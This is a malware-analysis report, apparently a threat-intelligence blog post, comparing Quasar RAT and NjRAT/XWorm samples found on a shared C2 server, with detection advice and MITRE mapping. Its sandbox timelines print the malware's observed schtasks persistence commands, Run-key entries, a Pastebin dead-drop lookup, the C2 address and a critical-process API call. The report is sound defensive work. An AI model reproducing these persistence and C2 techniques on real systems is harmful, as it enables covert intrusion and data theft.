---
title: "Quasar RAT vs. NjRAT/XWorm — Technical Deep-Dive"
date: '2025-12-06'
detection_page: /hunting-detections/dual-rat-analysis/
ioc_feed: /ioc-feeds/dual-rat-analysis.json
detection_sections:
  - label: "YARA Rules"
    anchor: "#yara-rules"
  - label: "Sigma Rules"
    anchor: "#sigma-rules"
  - label: "PowerShell Hunting"
    anchor: "#powershell-hunting-queries"
  - label: "Network Detection"
    anchor: "#network-detection-rules-suricastnort"
ioc_highlights:
  - value: "185[.]208[.]159[.]182"
    note: "Dual-RAT C2 infrastructure"
  - value: "2c4387ce18be279ea735ec4f0092698534921030aaa69949ae880e41a5c73766"
    note: "Quasar RAT client.exe SHA256"
layout: post
permalink: /reports/dual-rat-analysis/
thumbnail: /assets/images/cards/dual-rat-analysis.png
category: "Dual-RAT Analysis"
hide: true
description: "Comparative technical analysis of Quasar RAT and NjRAT/XWorm discovered on the same infrastructure as PULSAR RAT (185.208.159.182). The two samples represent opposing operational philosophies — Quasar prioritizing stealth and espionage, NjRAT/XWorm prioritizing aggressive resilience for mass deployment — both achieving full system compromise via different architectural approaches."
stix_bundle: /stix/dual-rat-analysis.json
---

**Campaign Identifier:** Dual-RAT-185.208.159.182-Quasar-NjRAT<br>
**Last Updated:** December 6, 2025<br>
**Threat Level:** HIGH


---

> **Investigation Continuation Note**: This analysis continues the original [PULSAR RAT (server.exe)]({{ "/reports/PULSAR-RAT/" | relative_url }}) investigation. Two additional files — client.exe and server (1).exe — appeared in the open directory at IP `185.208.159.182` during that investigation, indicating the operator was concurrently testing or deploying additional RAT families alongside PULSAR RAT.

---

## BLUF (Bottom Line Up Front)

### Executive Summary

### Business Impact Summary
Two .NET Remote Access Trojans — Quasar RAT and NjRAT/XWorm — were discovered on the same infrastructure as a [PULSAR RAT sample]({{ "/reports/PULSAR-RAT/" | relative_url }}), indicating the operator was simultaneously evaluating or deploying multiple RAT families. The two tools represent opposing operational philosophies: Quasar RAT prioritizes stealth and long-term espionage access (134 detected capabilities, process injection, single scheduled task); NjRAT/XWorm prioritizes aggressive resilience for mass deployment (62 capabilities, triple persistence, Pastebin dead-drop C2). Both achieve full system compromise.

### Key Risk Factors
<table class="professional-table">
  <thead>
    <tr>
      <th>Risk Factor</th>
      <th class="numeric">Quasar RAT</th>
      <th class="numeric">NjRAT/XWorm</th>
      <th>Business Impact</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><strong>Overall Risk</strong></td>
      <td class="numeric high">8.5/10 HIGH</td>
      <td class="numeric high">7.8/10 HIGH</td>
       <td>Both enable full system compromise; Quasar higher due to stealth</td>
    </tr>
    <tr>
      <td><strong>Data Exfiltration</strong></td>
      <td class="numeric critical">9/10 CRITICAL</td>
      <td class="numeric high">8/10 HIGH</td>
      <td>Quasar: 134 capabilities, NjRAT: 62 capabilities</td>
    </tr>
    <tr>
      <td><strong>Persistence Resilience</strong></td>
      <td class="numeric medium">6/10 MEDIUM</td>
      <td class="numeric critical">10/10 CRITICAL</td>
      <td>NjRAT's triple persistence makes removal extremely difficult</td>
    </tr>
    <tr>
      <td><strong>Detection Difficulty</strong></td>
      <td class="numeric high">8/10 HIGH</td>
      <td class="numeric medium">5/10 MEDIUM</td>
      <td>Quasar's stealth vs NjRAT's aggressive behavior</td>
    </tr>
    <tr>
      <td><strong>Infrastructure Resilience</strong></td>
      <td class="numeric medium">5/10 MEDIUM</td>
      <td class="numeric high">8/10 HIGH</td>
      <td>NjRAT's Pastebin dead-drop enables rapid C2 pivoting</td>
    </tr>
  </tbody>
</table>

### Recommended Actions
1. **Isolate** systems with scheduled tasks named RuntimeBroker or conhost executing from user-writable directories
2. **Block** C2 infrastructure at 185[.]208[.]159[.]182 and monitor Pastebin dead-drop URL patterns
3. **Deploy** behavioral detection rules for process injection and triple-persistence indicators (provided in the detection file)
4. **Audit** PowerShell and security logs for Zone.Identifier removal and anomalous script execution
5. **Monitor** for VB.NET processes initiating network activity, and for Pastebin HTTPS requests from non-browser processes followed by arbitrary TCP connections

---

## Sample 1: Quasar RAT Analysis

### File Identification
- **Original Filename**: client.exe
- **SHA256**: 2c4387ce18be279ea735ec4f0092698534921030aaa69949ae880e41a5c73766
- **File Size**: 1,571,840 bytes
- **Type**: C# .NET executable
- **Family**: Quasar RAT (open-source, formerly xRAT)
- **YARA Detection**: HKTL_NET_GUID_Quasar

**Discovery Context**: This sample appeared in the investigation directory at IP 185.208.159.182 during analysis of the original [PULSAR RAT server.exe]({{ "/reports/PULSAR-RAT/" | relative_url }}), suggesting the threat actors were actively deploying multiple RAT variants.

### Executive Technical Summary

### Business Context
Quasar RAT is a professional-grade espionage tool associated with APT10 and sophisticated threat actors. Its design prioritizes stealth and long-term access over aggressive persistence — making it especially dangerous for high-value targets where detection would compromise broader operations.

### Key Business Impacts
- **Long-term espionage**: 134 detected capabilities enable comprehensive intelligence gathering
- **Stealth operations**: Process injection and anti-analysis make detection extremely difficult
- **Credential harvesting**: Browser password theft threatens corporate accounts
- **Network pivoting**: SOCKS proxy capabilities enable lateral movement through compromised endpoints

### Detection Challenges
- **Process injection**: Malicious code hidden within legitimate system processes
- **Encrypted C2**: Custom encryption prevents network-based detection
- **Anti-analysis**: VM, debugger, and sandbox evasion defeat security research
- **Minimal persistence**: Single scheduled task reduces event log footprint

### Executive Risk Assessment
**HIGH RISK** — Quasar RAT's professional development and APT10 association indicate targeted espionage operations. The combination of 134 capabilities and stealth-focused design creates HIGH risk for long-term compromise and intellectual property theft.

---

### Deep Technical Analysis

### Code Architecture & Design Philosophy

#### Deep Technical Analysis

> **Analyst note:** This section covers Quasar RAT's internal code structure and anti-analysis design. Understanding the architecture explains why traditional detection methods fail and which behavioral signals remain reliable.

Quasar RAT compiles as a C# .NET assembly with a modular architecture: dedicated namespaces handle core functionality, surveillance, system control, and network operations. Capability analysis (CAPA) detected 134 distinct functions, including process injection, privilege escalation, keylogging, screenshot capture, and browser credential harvesting. Anti-analysis features span VM detection for VirtualBox, VMware, and QEMU environments; debugger evasion; and sandbox detection.

#### Executive Technical Context
**What This Means**: Quasar's modular C# architecture allows the operator to customize capabilities per target. 134 detected functions represent a feature set comparable to commercial remote access software.

**Business Impact**: Professional code quality and anti-analysis depth indicate state-sponsored or highly sophisticated criminal operations — this is a purpose-built espionage tool, not opportunistic malware.

**Detection Implications**: Traditional signature-based detection is ineffective. Process injection hides malicious activity within legitimate processes; easy recompilation defeats static signatures; encrypted C2 prevents network inspection. Behavioral monitoring is the reliable detection path.

**Resource Allocation**: Effective defense requires behavioral EDR with process injection detection and network monitoring for encrypted C2 patterns.

### Persistence Mechanism Analysis

#### Deep Technical Analysis

> **Analyst note:** Persistence is how malware survives system reboots and re-executes automatically. This section covers the specific mechanism Quasar RAT uses and the registry artifacts it leaves behind — the primary forensic evidence for detection and removal.

Quasar RAT establishes persistence through a single scheduled task named "RuntimeBroker," created to execute on user logon with highest privileges from a user-writable directory. Registry artifacts written to the TaskCache include the task GUID and execution parameters.

#### Executive Technical Context
**What This Means**: The "RuntimeBroker" task name mimics a legitimate Windows process, attempting to blend in with normal system operations. However, legitimate RuntimeBroker is a system process, not a scheduled task, making this detectable with proper baseline knowledge.

**Business Impact**: Single persistence mechanism creates lower event log noise but also provides single point of failure for defenders. If identified and removed, the malware loses persistence completely.

**Detection Strategy**: Monitor for scheduled task named "RuntimeBroker" (T1053.005) executing from a user-writable directory. Monitor for task actions executing from "%AppData%\SubDir\Client.exe". Monitor for ONLOGON triggers with HIGHEST privilege requests.

**Remediation Complexity**: **MEDIUM** - Single persistence mechanism makes cleanup straightforward, but thorough forensics required to determine dwell time and data exfiltration scope.

### Command & Control Infrastructure

#### Deep Technical Analysis

> **Analyst note:** C2 (Command and Control) is the communication channel between the malware and the attacker. This section covers how Quasar RAT locates the attacker's server, what traffic it generates, and how it encrypts communications to evade inspection.

Quasar RAT connects directly to fixed C2 infrastructure at 185.208.159.182 on port 4782 using custom encryption. Before establishing the C2 channel, the malware performs pre-beacon reconnaissance — making HTTP requests to external IP discovery services (ipwho.is, api.ipify.org) to determine the victim's external IP address.

#### Executive Technical Context
**What This Means**: Direct IP connection creates single point of failure for C2 infrastructure. If defenders block 185.208.159.182, the malware loses all communication capabilities.

**Business Impact**: Fixed C2 infrastructure makes network-based blocking effective, but the custom encryption prevents Deep Packet Inspection (DPI) from identifying malicious payloads.

**Detection Strategy**: Monitor for outbound TCP connections to 185.208.159.182:4782. Monitor for processes making HTTP requests to IP geolocation services like ipwho.is or api.ipify.org before establishing unusual TCP connections. Monitor for encrypted traffic patterns consistent with C2 beacons (regular intervals, small payloads).

**Infrastructure Resilience**: **LOW** - Bullet-proof hosting provider but fixed IP address enables effective blocking through network security controls.

### Mark of the Web Removal Capability

#### Deep Technical Analysis

> **Analyst note:** Windows tags files downloaded from the internet with a hidden metadata stream called Zone.Identifier — the "mark of the web" — which triggers SmartScreen warnings when a user runs the file. This section covers how Quasar RAT removes that tag to suppress those warnings.

Quasar RAT removes the Zone.Identifier alternate data stream from downloaded files using the DeleteFile API, stripping the mark-of-the-web that Windows uses to identify potentially dangerous downloads. The effect is that the file appears to Windows as if it originated locally.

#### Executive Technical Context
**What This Means**: The malware actively removes security markers that Windows uses to warn users about downloaded files, making the malware appear as if it originated locally.

**Business Impact**: This technique increases user deception and can bypass basic security awareness training. Users may execute files they would otherwise avoid due to security warnings.

**Detection Strategy**: Monitor for processes deleting the alternate data stream ":Zone.Identifier" from downloaded files. Monitor for files that lose their Zone.Identifier after being written to disk. Monitor for security tool logs showing missing download source information.

**Security Control Implications**: This technique bypasses Windows SmartScreen filtering, application reputation systems, and user security awareness based on download warnings.

---

### Dynamic Sandbox Analysis

### Execution Timeline (Noriben Analysis)

> **Analyst note:** The following timeline captures client.exe's behavior step-by-step as observed in a behavioral sandbox (Noriben). Each phase records the actual system calls, file operations, and network connections in execution order — the sequence a defender would see in endpoint logs.

#### Phase 1: Initial Execution & Installation
**Time: 20:10:54**

```
Process: client.exe (PID: 9668)
Parent: python.exe (PID: 7424) [Analysis launcher]
Command Line: "%UserProfile%\.MalwareAnalysis\Samples\incoming\client.exe"
```

**Step 1: Mark of the Web Removal**
```
[DeleteFile] client.exe:9668 > C:\Users\<user>\Downloads\client.exe:Zone.Identifier
Purpose: Remove Windows security marker
```

**Step 2: Self-Copy to Persistent Location**
```
[CreateFile] client.exe:9668 > C:\Users\<user>\AppData\Roaming\SubDir\Client.exe
[WriteFile] client.exe:9668 > 1,571,840 bytes written
Purpose: Install to user-writable directory for persistence
```

#### Phase 2: Persistence Establishment
**Time: 20:10:54**

**Step 3: Scheduled Task Creation**
```
[CreateProcess] client.exe:9668 > "schtasks /create /tn RuntimeBroker /sc ONLOGON /tr %AppData%\SubDir\Client.exe /rl HIGHEST /f"
Child PID: 7004
Purpose: Create persistence mechanism
```

**Registry Artifacts Created**:
```
[RegSetValue] HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\RuntimeBroker\Id
[RegSetValue] HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\RuntimeBroker\Index = 2
[RegSetValue] HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\{GUID}\Path = \RuntimeBroker
```

#### Phase 3: Activation & Network Reconnaissance
**Time: 20:10:54**

**Step 4: Execution from Persistent Location**
```
[CreateProcess] client.exe:9668 > "%AppData%\SubDir\Client.exe"
Child PID: 4120
Purpose: Execute from installed location
```

**Step 5: Network Connectivity Verification**
```
[TCP Connect] Client.exe:4120 > ipwho.is:443
[HTTP GET] Client.exe:4120 > GET / HTTP/1.1
Host: ipwho.is
Purpose: Verify internet connectivity and discover external IP
```

**Step 6: Secondary IP Discovery**
```
[TCP Connect] Client.exe:4120 > api.ipify.org:443
[HTTP GET] Client.exe:4120 > GET / HTTP/1.1
Host: api.ipify.org
Purpose: Backup IP discovery method
```

#### Phase 4: Command & Control Establishment
**Time: 20:14:36**

**Step 7: Primary C2 Connection**
```
[TCP Connect] Client.exe:4120 > 185.208.159.182:4782
[TCP Send] Client.exe:4120 > [Encrypted beacon payload - 247 bytes]
[TCP Receive] 185.208.159.182:4782 > [Encrypted response - 89 bytes]
Purpose: Establish command and control channel
```

### Behavioral Analysis Summary

#### Executive Technical Context
**What This Timeline Shows**: Quasar RAT executes a methodical, four-phase infection: installation, persistence, reconnaissance, then C2 establishment — with approximately four minutes between first execution and first C2 contact.

**Key Behavioral Indicators**:
1. **Security bypass**: Immediate Zone.Identifier removal
2. **Stealth installation**: Copy to AppData rather than system directories
3. **Legitimate process mimicry**: RuntimeBroker scheduled task name
4. **Pre-C2 reconnaissance**: IP discovery before contacting C2
5. **Delayed C2 contact**: ~4 minutes between execution and C2 connection

**Business Impact**: The four-minute delay before C2 contact is a deliberate evasion technique targeting dynamic analysis sandboxes with short observation windows.

**Detection Windows**:
- **Initial execution**: File creation and Zone.Identifier removal
- **Persistence**: Scheduled task creation events
- **Reconnaissance**: HTTP requests to IP geolocation services
- **C2 establishment**: TCP connection to 185.208.159.182:4782

---

## Sample 2: NjRAT/XWorm Analysis

### File Identification
- **Original Filename**: server (1).exe
- **SHA256**: 950aadba6993619858294599b3458d5d2221f10fe72b3db3e49883d496a705bb
- **File Size**: 37,888 bytes (26x smaller than Quasar)
- **Type**: VB.NET executable
- **Family**: NjRAT/XWorm (Bladabindi variant)
- **Version**: XWorm 3.0-5.0 (DiE confirmed)
- **YARA Detection**: Njrat, BlackWorm

**Discovery Context**: This sample also appeared in the investigation directory at IP 185.208.159.182 alongside the Quasar sample, indicating the threat actors were simultaneously deploying multiple RAT families during the [PULSAR RAT investigation]({{ "/reports/PULSAR-RAT/" | relative_url }}).

### Executive Technical Summary

### Business Context
NjRAT/XWorm is commodity malware optimized for mass deployment through aggressive resilience. Its compact size (37KB) and triple-redundant persistence make it suited for opportunistic attacks where some detections are acceptable as long as overall access is maintained.

### Key Business Impacts
- **Rapid deployment**: Small file size enables fast distribution and evades file-size-based detection heuristics
- **Resilient access**: Triple persistence makes complete removal extremely difficult
- **Real-time surveillance**: Webcam and microphone streaming enable immediate intelligence collection
- **Infrastructure flexibility**: Pastebin dead-drop enables rapid C2 pivoting without redeploying the malware

### Detection Advantages
- **Aggressive behavior**: 1-minute scheduled task creates obvious detection opportunities
- **Triple persistence**: Multiple simultaneous mechanisms increase the detection surface
- **Network pattern**: Pastebin HTTPS request followed by arbitrary TCP connection is a behavioral signature
- **Process characteristics**: VB.NET processes with network activity are uncommon in most environments

### Executive Risk Assessment
**HIGH RISK** — NjRAT/XWorm's aggressive persistence and real-time surveillance capabilities create HIGH risk for privacy violations and data theft. Its prevalence (18,459+ infections H1 2025) demonstrates widespread operational effectiveness despite commodity status.

---

### Deep Technical Analysis

### Code Architecture & Design Philosophy

#### Deep Technical Analysis

> **Analyst note:** This section covers NjRAT/XWorm's internal structure and capability set. Compared to Quasar RAT, the design philosophy trades feature depth for operational efficiency — smaller binary, faster deployment, and more aggressive persistence over stealth.

NjRAT/XWorm compiles as a VB.NET executable with a module-based structure: dedicated components handle client-server communication, surveillance operations, and persistence. Capability analysis detected 62 distinct functions, including persistence via registry keys and scheduled tasks, webcam streaming, keylogging, GZip data compression, and C2 resolution through Pastebin dead-drops. The malware also implements critical process protection and anti-sleep mechanisms to maintain operational continuity.

#### Executive Technical Context
**What This Means**: The VB.NET codebase and 37KB size reflect efficiency-focused design — rapid deployment over feature breadth. The 62 detected functions cover core RAT capabilities without Quasar's extensive feature set.

**Business Impact**: NjRAT's prevalence (18,459+ infections H1 2025) demonstrates high operational effectiveness despite its simplicity. Compact size evades file-size-based detection heuristics and accelerates phishing distribution.

**Detection Advantages**: VB.NET compilation produces distinct runtime characteristics detectable through behavioral monitoring. The smaller codebase is also more tractable for static analysis than heavily obfuscated C# variants.

**Resource Allocation**: Effective defense requires scheduled task monitoring for sub-5-minute intervals, registry Run key alerting, network monitoring for Pastebin dead-drop patterns, and process monitoring for VB.NET executables with network activity.

### Triple-Redundant Persistence Mechanism

#### Deep Technical Analysis

> **Analyst note:** This section describes how NjRAT/XWorm survives reboots and process termination using three simultaneous persistence methods. The self-healing design means removing one mechanism is insufficient — all three must be removed together.

NjRAT/XWorm establishes three simultaneous persistence mechanisms: a high-frequency scheduled task named "conhost" that executes every minute, a registry Run key entry pointing to the malware executable, and a startup folder shortcut. This triple-redundant design means the malware survives removal of any individual mechanism.

#### Executive Technical Context
**What This Means**: Triple-redundant persistence creates a self-healing capability — removing one or two mechanisms leaves the third to re-establish the others. The 1-minute scheduled task interval is unusually aggressive and has no legitimate equivalent in standard software.

**Business Impact**: Complete removal requires systematic elimination of all three mechanisms, plus hunting for additional copies and reinfection vectors. Partial removal leads to rapid re-establishment and extended dwell time.

**Detection Strategy**: Monitor for scheduled task "conhost" executing at 1-minute intervals (T1053.005). Monitor for simultaneous creation of a "conhost" scheduled task, "conhost" Run key, and "conhost.lnk" in the Startup folder. Monitor for new Run key entries pointing to user-writable directories and Startup folder additions from non-installer processes.

**Remediation Complexity**: **HIGH** — Requires systematic removal of all three mechanisms plus thorough hunting for additional copies or reinfection vectors.

### Pastebin Dead-Drop C2 Architecture

#### Deep Technical Analysis

> **Analyst note:** A "dead-drop resolver" is a technique where the malware does not hardcode its C2 server address — instead it reads the address from a public web service that the attacker controls. This section covers how NjRAT/XWorm uses Pastebin as that resolver, and why it makes traditional IP-blocking ineffective.

NjRAT/XWorm resolves its C2 endpoint via Pastebin dead-drop. The malware sends an HTTP GET request to `https://pastebin.com/raw/bzg5zj8n` using a spoofed mobile user-agent string, then parses the response to extract the actual C2 IP and port for TCP connection establishment.

#### Executive Technical Context
**What This Means**: Dead-drop C2 architecture lets the attacker change servers in seconds by editing a Pastebin post — without updating or redeploying the malware. The current C2 address is never burned into the binary.

**Business Impact**: Traditional IOC-based blocking (IP and domain blacklists) is ineffective against this architecture. Blocking the current C2 IP does not prevent reinfected or persistent systems from resolving a new one. Behavior-based detection is the reliable response path.

**Detection Strategy**: Monitor for HTTP GET requests to `https://pastebin.com/raw/bzg5zj8n`. Monitor for non-browser processes making HTTPS requests to pastebin.com followed by TCP connections to arbitrary IPs and ports. Monitor for the mobile user-agent string `Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.0 Mobile/15E148 Safari/604.1` originating from desktop processes.

**Infrastructure Resilience**: **HIGH** — The attacker can change C2 endpoints in seconds, making takedown operations ineffective against already-deployed implants.

### Critical Process Protection & Anti-Sleep

#### Deep Technical Analysis

> **Analyst note:** This section covers two defensive mechanisms NjRAT/XWorm uses to protect itself from termination and ensure continuous surveillance. One directly threatens system stability during incident response; the other prevents the host from sleeping while the malware is active.

NjRAT/XWorm calls `RtlSetProcessIsCritical` to mark itself as critical to system operation — a designation normally reserved for core Windows processes — triggering a BSOD if the process is forcibly terminated. The malware also calls `SetThreadExecutionState` to prevent system sleep during surveillance operations.

#### Executive Technical Context
**What This Means**: Attempting to kill the process through standard task management will crash the system. Anti-sleep functionality ensures surveillance continues uninterrupted during extended operations.

**Business Impact**: These mechanisms force a careful, tool-specific removal sequence. An analyst who terminates the process through normal means will trigger a system crash, requiring a reboot and potentially complicating forensic collection.

**Detection Strategy**: Monitor for `RtlSetProcessIsCritical` (T1489) calls from non-system processes such as user-space `conhost.exe`. Monitor for `SetThreadExecutionState` calls from non-system processes. Monitor for system crashes following process termination attempts.

**Remediation Implications**: Specialized tools and procedures are required to safely clear critical-process protection before termination — standard task-kill approaches will crash the host.

---

### Dynamic Sandbox Analysis

### Execution Timeline (Behavioral Observation)

> **Analyst note:** The following timeline records server (1).exe's behavior as observed in a behavioral sandbox. Unlike Quasar RAT's methodical phased approach, NjRAT/XWorm establishes all three persistence mechanisms immediately upon first execution, before resolving C2.

#### Phase 1: Initial Execution & Masquerading
**Time: Initial Launch**

```
Process: server (1).exe (PID: 10092)
Parent: explorer.exe (user execution)
Command Line: "C:\Users\<user>\Downloads\server (1).exe"
```

**Step 1: Payload Dropping**
```
[CreateFile] server (1).exe:10092 > C:\Users\<user>\conhost.exe
[WriteFile] server (1).exe:10092 > 37,888 bytes written
Purpose: Drop payload with legitimate process name
```

#### Phase 2: Triple Persistence Establishment
**Time: Immediate**

**Step 3: High-Frequency Scheduled Task**
```
[CreateProcess] server (1).exe:10092 > "schtasks.exe /create /f /sc minute /mo 1 /tn ""conhost"" /tr ""C:\Users\<user>\conhost.exe"""
Child PID: [scheduler_process]
Purpose: Create 1-minute interval persistence
```

**Step 4: Registry Run Key Creation**
```
[RegSetValue] server (1).exe:10092 > HKCU\Software\Microsoft\Windows\CurrentVersion\Run\conhost
Value Data: C:\Users\<user>\conhost.exe
Purpose: Registry-based persistence
```

**Step 5: Startup Folder Shortcut**
```
[CreateFile] server (1).exe:10092 > C:\Users\<user>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\conhost.lnk
Purpose: Startup folder persistence
```

#### Phase 3: C2 Infrastructure Resolution
**Time: Post-Persistence**

**Step 6: Pastebin Dead-Drop Query**
```
[DNS Query] server (1).exe:10092 > pastebin.com (A record)
[TCP Connect] server (1).exe:10092 > pastebin.com:443
[HTTP GET] server (1).exe:10092 > GET /raw/bzg5zj8n HTTP/1.1
Host: pastebin.com
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.0 Mobile/15E148 Safari/604.1
Purpose: Retrieve current C2 endpoint
```

**Step 7: C2 Connection Attempt**
```
[TCP Connect] server (1).exe:10092 > [RESOLVED_C2_IP]:[RESOLVED_PORT]
Purpose: Establish command and control
```

#### Phase 4: System Protection & Crash
**Time: Post-C2 Setup**

**Step 8: Critical Process Protection**
```
[API Call] server (1).exe:10092 > RtlSetProcessIsCritical(TRUE, TRUE, FALSE)
Purpose: Enable anti-termination protection
```

**Step 9: Process Crash**
```
[Process Exit] server (1).exe:10092 > Exit Code: 0xC0000005 (Access Violation)
[CreateProcess] Windows Error Reporting > WerFault.exe
Purpose: System crash handling
```

### Behavioral Analysis Summary

#### Executive Technical Context
**What This Timeline Shows**: NjRAT/XWorm establishes all three persistence mechanisms immediately upon execution, before resolving C2 — prioritizing survival over stealth.

**Key Behavioral Indicators**:
1. **Process masquerading**: Drops payload as "conhost.exe"
2. **Aggressive persistence**: Three mechanisms established simultaneously on first run
3. **Infrastructure flexibility**: Pastebin dead-drop for C2 resolution
4. **System protection**: Critical process and anti-sleep API calls
5. **Mobile spoofing**: iPhone user-agent for Pastebin requests

**Detection Windows**:
- **Initial execution**: File dropping and process creation events
- **Persistence**: Simultaneous scheduled task, Run key, and startup folder creation
- **Network**: Pastebin HTTPS access followed by arbitrary TCP connections
- **System protection**: `RtlSetProcessIsCritical` API calls from non-system processes

**Business Impact**: Aggressive persistence and critical-process protection make this malware difficult to remove and hazardous to terminate without specialized tooling.

---

## Delivery Method Analysis & Initial Access Vectors

### Common Infection Vectors

Both Quasar RAT and NjRAT/XWorm reach victims primarily through phishing and social engineering, though delivery mechanisms reflect their different operational philosophies.

### Quasar RAT Delivery Patterns
**Targeted delivery approach**:
- Spear-phishing emails with malicious Office documents (Word, Excel macros) or weaponized PDFs
- ZIP archives containing executables disguised as legitimate files
- PowerShell droppers for fileless execution and defense evasion
- Software vulnerability exploitation in targeted environments

**Typical victim profile**: High-value targets in government, defense, energy, and manufacturing — sectors where APT10 operates.

### NjRAT/XWorm Delivery Patterns
**Mass-delivery approach**:
- Bulk phishing campaigns with infected attachments
- Malvertising through compromised websites
- USB drive propagation (prevalent in Middle East and Asia)
- Trojanized software distributed through underground forums
- Exploit kit integration for automated infection of vulnerable systems

**Typical victim profile**: Broad opportunistic targeting across industries.

### Key Risk Factors
- Email is the primary vector for both families
- USB propagation creates air-gapped network risk for NjRAT variants
- Fileless PowerShell droppers bypass file-based detection
- Supply chain compromise potential given widespread use of both families

### Prevention Recommendations
1. **Email security controls**: Attachment sandboxing and macro execution restrictions
2. **Removable media controls**: AutoRun restrictions and USB device policy enforcement
3. **Execution controls**: Process execution monitoring and allowlisting for unauthorized executables
4. **Network segmentation**: Controls limiting lateral movement from compromised endpoints
5. **Endpoint behavioral monitoring**: Detection coverage for suspicious process creation patterns

---

## Future Evolution & Threat Trends

### Emerging Capabilities to Watch

Commodity RAT development is trending toward enhanced evasion, expanded surveillance, and more resilient C2 architectures that will challenge current detection approaches.

### Technical Evolution Trends
**Enhanced evasion techniques**:
- ML-powered anti-analysis for sandbox environment detection
- Polymorphic code generation and runtime decryption
- Expanded living-off-the-land reliance on legitimate system tools and APIs
- Memory-only execution to minimize on-disk artifacts

**New surveillance capabilities**:
- Cross-platform variants targeting macOS and Linux environments
- Browser extension integration for enhanced credential harvesting
- Cloud service integration targeting SaaS applications and API tokens

### Operational Evolution Trends
**Infrastructure modernization**:
- Dynamic C2 with domain name rotation and IP cycling
- Decentralized peer-to-peer command structures
- Blockchain-based C2 for censorship-resistant control channels

**Integration with advanced threats**:
- Ransomware bundling with existing RAT access
- Supply chain weaponization through legitimate software updates
- Faster zero-day weaponization pipelines

### Detection Challenges Ahead
**Adaptive evasion**:
- Behavioral mimicry to blend with legitimate user patterns
- Anti-forensic evidence destruction and timeline manipulation
- Multi-stage deployment chains that evade single-point detection

**Evolving detection requirements**:
- Memory forensics coverage will become essential as fileless techniques proliferate
- Network traffic analysis must adapt to detect encrypted and obfuscated C2
- Behavioral analytics and threat hunting programs focused on emerging TTP patterns are the primary defensive investment priorities

---

## Comparative Technical Analysis

**Investigation Context**: The co-presence of Quasar RAT and NjRAT/XWorm on the same infrastructure as [PULSAR RAT]({{ "/reports/PULSAR-RAT/" | relative_url }}) indicates an operator assembling a multi-tool capability set — one family for targeted stealth operations, one for resilient mass deployment.

### Design Philosophy Comparison

### Stealth vs. Resilience Trade-off

**Quasar RAT - Stealth-First Approach**:
- **Minimal Persistence**: Single scheduled task reduces event log footprint
- **Process Injection**: Hides malicious activity within legitimate processes
- **Extensive Anti-Analysis**: VM, debugger, and sandbox detection
- **Professional Codebase**: Sophisticated C# architecture with 134 capabilities
- **Fixed Infrastructure**: Direct C2 connection creates single point of failure

**NjRAT/XWorm - Resilience-First Approach**:
- **Aggressive Persistence**: Triple mechanisms ensure survival
- **High-Frequency Execution**: 1-minute task enables rapid recovery
- **Infrastructure Flexibility**: Pastebin dead-drop enables rapid C2 pivoting
- **Compact Design**: 37KB VB.NET executable optimized for distribution
- **System Protection**: Critical process features complicate removal

### Business Impact Assessment

**Target Environment Optimization**:
- **Quasar RAT**: Optimized for high-value targets where detection compromises broader operations
- **NjRAT/XWorm**: Optimized for mass deployment where some detections are acceptable

**Remediation Complexity**:
- **Quasar RAT**: **MEDIUM** - Single persistence mechanism but thorough forensics required
- **NjRAT/XWorm**: **HIGH** - Triple persistence requires systematic cleanup and critical process handling

**Detection Surface**:
- **Quasar RAT**: **LOW** - Stealth-focused design minimizes detection opportunities
- **NjRAT/XWorm**: **HIGH** - Aggressive behavior creates multiple detection opportunities

---

## MITRE ATT&CK Mapping

### Quasar RAT - ATT&CK Mapping

<table class="professional-table">
  <thead>
    <tr>
      <th>Tactic</th>
      <th>Technique ID</th>
      <th>Technique Name</th>
      <th>Evidence</th>
      <th>Confidence</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><strong>Execution</strong></td>
      <td>T1204.002</td>
      <td>User Execution: Malicious File</td>
      <td>Requires user to execute initial payload</td>
      <td class="confirmed">CONFIRMED</td>
    </tr>
    <tr>
      <td><strong>Persistence</strong></td>
      <td>T1053.005</td>
      <td>Scheduled Task/Job: Scheduled Task</td>
      <td>RuntimeBroker task creation observed</td>
      <td class="confirmed">CONFIRMED</td>
    </tr>
    <tr>
      <td><strong>Defense Evasion</strong></td>
      <td>T1055.003</td>
      <td>Process Injection: Thread Execution Hijacking</td>
      <td>inject_thread capability detected (CAPA)</td>
      <td class="confirmed">CONFIRMED</td>
    </tr>
    <tr>
      <td><strong>Defense Evasion</strong></td>
      <td>T1497.001</td>
      <td>Virtualization/Sandbox Evasion: System Checks</td>
      <td>VM detection (VBox, VMware, Qemu) confirmed</td>
      <td class="confirmed">CONFIRMED</td>
    </tr>
    <tr>
      <td><strong>Defense Evasion</strong></td>
      <td>T1622</td>
      <td>Debugger Evasion</td>
      <td>hide thread from debugger (CAPA)</td>
      <td class="confirmed">CONFIRMED</td>
    </tr>
    <tr>
      <td><strong>Credential Access</strong></td>
      <td>T1056.001</td>
      <td>Input Capture: Keylogging</td>
      <td>Keyboard hook implementation observed</td>
      <td class="confirmed">CONFIRMED</td>
    </tr>
    <tr>
      <td><strong>Credential Access</strong></td>
      <td>T1555.003</td>
      <td>Credentials from Password Stores: Web Browsers</td>
      <td>Browser password recovery modules confirmed</td>
      <td class="confirmed">CONFIRMED</td>
    </tr>
    <tr>
      <td><strong>Collection</strong></td>
      <td>T1113</td>
      <td>Screen Capture</td>
      <td>Screenshot functionality observed</td>
      <td class="confirmed">CONFIRMED</td>
    </tr>
    <tr>
      <td><strong>Command and Control</strong></td>
      <td>T1071.001</td>
      <td>Application Layer Protocol: Web Protocols</td>
      <td>HTTP reconnaissance to ipwho.is, ipify.org</td>
      <td class="confirmed">CONFIRMED</td>
    </tr>
    <tr>
      <td><strong>Command and Control</strong></td>
      <td>T1573</td>
      <td>Encrypted Channel</td>
      <td>Custom encryption for C2 traffic</td>
      <td class="confirmed">CONFIRMED</td>
    </tr>
    <tr>
      <td><strong>Exfiltration</strong></td>
      <td>T1041</td>
      <td>Exfiltration Over C2 Channel</td>
      <td>Data sent via established C2 connection</td>
